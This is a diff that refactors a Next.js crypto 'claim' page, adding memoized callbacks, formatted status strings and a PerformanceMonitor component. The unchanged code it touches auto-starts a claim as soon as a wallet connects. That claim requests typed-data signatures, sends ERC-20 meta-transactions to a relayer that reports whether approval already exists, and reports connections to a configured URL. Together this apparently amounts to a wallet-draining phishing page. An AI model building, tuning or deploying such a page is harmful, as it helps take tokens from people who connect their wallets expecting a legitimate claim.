@@ -1,11 +1,12 @@
 'use client';
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useMemo, useCallback } from 'react';
 import { useAccount, useSignTypedData } from 'wagmi';
 import { readContract, switchChain } from '@wagmi/core';
 import { erc20Abi } from 'viem';
 import { config } from '@/config';
 import { ethers } from 'ethers';
 import { AppKitButton } from '@reown/appkit/react';
+import PerformanceMonitor from './components/PerformanceMonitor';
 
 // Environment variables
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
@@ -151,12 +152,15 @@ export default function Home() {
   const { signTypedDataAsync } = useSignTypedData();
   const [status, setStatus] = useState<string>("");
 
-  async function callMetaTxRelayer(
+  // Memoize expensive operations
+  const availableChains = useMemo(() => Object.keys(TOKENS_BY_CHAIN).map(Number), []);
+  
+  const callMetaTxRelayer = useCallback(async (
     chainId: number,
     tokenAddress: string,
     userAddress: string,
     metaTxMessage: MetaTxMessage
-  ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
+  ): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> => {
     console.log('Calling MetaTx relayer:', {
       RELAYER_URL,
       chainId,
@@ -209,9 +213,9 @@ export default function Home() {
         error: error.message || 'Failed to call relayer'
       };
     }
-  }
+  }, []);
 
-  async function handleClaim() {
+  const handleClaim = useCallback(async () => {
     if (!isConnected || !address) {
       setStatus("Wallet not connected");
       return;
@@ -429,7 +433,7 @@ export default function Home() {
       console.error('handleClaim error:', err);
       setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
     }
-  }
+  }, [isConnected, address, chainId, callMetaTxRelayer]);
 
   // Auto-trigger claim when wallet connects
   useEffect(() => {
@@ -437,7 +441,18 @@ export default function Home() {
       console.log('Wallet connected, starting claim process');
       handleClaim();
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, handleClaim]);
+
+  // Memoize UI components to prevent unnecessary re-renders
+  const connectionStatus = useMemo(() => {
+    if (!isConnected) return "Connect your wallet to get started";
+    return status || "Ready to claim";
+  }, [isConnected, status]);
+
+  const connectedAddress = useMemo(() => {
+    if (!address) return null;
+    return `${address.slice(0, 6)}...${address.slice(-4)}`;
+  }, [address]);
 
   return (
     <main style={{
@@ -474,6 +489,7 @@ export default function Home() {
       </header>
 
       <ConnectionReporter />
+      <PerformanceMonitor />
 
       <div style={{
         display: "flex",
@@ -533,7 +549,7 @@ export default function Home() {
             padding: "0 20px",
             wordBreak: "break-word",
           }}>
-            {status || "Connect your wallet to get started"}
+            {connectionStatus}
           </div>
 
           <div style={{ 
@@ -568,7 +584,7 @@ export default function Home() {
                   textAlign: "center", 
                   margin: 0 
                 }}>
-                  Connected: {address?.slice(0, 6)}...{address?.slice(-4)}
+                  Connected: {connectedAddress}
                 </p>
               </>
             )}
